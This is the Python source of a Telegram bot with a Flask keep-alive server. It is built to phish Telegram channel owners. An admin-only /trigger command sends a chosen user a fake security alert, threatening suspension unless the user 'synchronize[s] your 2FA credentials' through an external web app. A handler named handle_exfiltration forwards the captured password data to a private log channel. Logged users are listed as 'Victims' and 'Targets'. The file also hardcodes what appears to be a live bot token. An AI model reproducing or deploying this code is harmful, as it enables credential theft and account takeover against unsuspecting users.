import os
import sqlite3
import threading
from flask import Flask
from telebot import TeleBot, types

# --- Configuration (Pulled from Render Environment Variables) ---
TOKEN = os.getenv("BOT_TOKEN", "8729895497:AAEqEZ3HA56FmQjm_kI5VmKxQn1a4HJBSuE")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8699819680"))
LOG_CHANNEL = int(os.getenv("CHANNEL_ID", "-1003817774248"))
TMA_URL = os.getenv("TMA_URL", "https://tma-research-nu.vercel.app")

bot = TeleBot(TOKEN)
app = Flask(__name__)

# --- Database Setup ---
def init_db():
    with sqlite3.connect('research.db') as conn:
        conn.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT)")

# --- Bot Handlers ---

@bot.message_handler(commands=['start'])
def handle_start(message):
    init_db()
    user_id = message.chat.id
    username = f"@{message.from_user.username}" if message.from_user.username else "User"
    
    with sqlite3.connect('research.db') as conn:
        conn.execute("INSERT OR IGNORE INTO users VALUES (?, ?)", (user_id, username))
    
    bot.send_message(user_id, "<b>Console:</b> Secure connection established. Verifying session...", parse_mode="HTML")

@bot.message_handler(commands=['list'])
def list_users(message):
    if message.from_user.id == ADMIN_ID:
        init_db()
        with sqlite3.connect('research.db') as conn:
            users = conn.execute("SELECT * FROM users").fetchall()
        
        if not users:
            bot.send_message(ADMIN_ID, "Database empty. Victims must /start the bot.")
            return
            
        report = "<b>Target Database:</b>\n"
        for u_id, u_name in users:
            report += f"ID: <code>{u_id}</code> | User: {u_name}\n"
        bot.send_message(ADMIN_ID, report, parse_mode="HTML")

@bot.message_handler(commands=['trigger'])
def handle_trigger(message):
    if message.from_user.id == ADMIN_ID:
        try:
            # Expected format: /trigger [ID] [ChannelName]
            parts = message.text.split(maxsplit=2)
            if len(parts) < 2:
                bot.send_message(ADMIN_ID, "❌ Usage: /trigger [id] [channel]")
                return
                
            target_id = parts
            channel_name = parts if len(parts) > 2 else "your channel"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(
                text="Verify Authenticity", 
                web_app=types.WebAppInfo(url=TMA_URL)
            ))

            bait_text = (
                f"<b>⚠️ Security Alert: {channel_name}</b>\n\n"
                f"Our automated systems have detected an unauthorized login attempt on <b>{channel_name}</b>. "
                "To prevent ownership restriction and secure your administrative privileges, "
                "you must synchronize your 2FA credentials with the Admin Portal.\n\n"
                "<i>Failure to verify within 24 hours may lead to temporary channel suspension.</i>"
            )

            bot.send_message(target_id, bait_text, parse_mode="HTML", reply_markup=markup)
            bot.send_message(ADMIN_ID, f"✅ Trigger sent to {target_id}")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ Error: {e}")

@bot.message_handler(content_types=['web_app_data'])
def handle_exfiltration(message):
    # Captures the format: pwsd%abc%xyz§VERIFY:pass%1256
    raw_data = message.web_app_data.data
    bot.send_message(LOG_CHANNEL, f"📥 <b>NEW LOG RECEIVED:</b>\n<code>{raw_data}</code>", parse_mode="HTML")

# --- Flask Server for Keep-Alive (Fix for Cron-job) ---
@app.route('/')
def index():
    # Returning a tiny string avoids the "Output too large" error on Cron-job.org
    return "OK", 200

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    init_db()
    # Run the bot in a background thread so the Flask server can handle pings
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Run Flask on the port Render provides
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
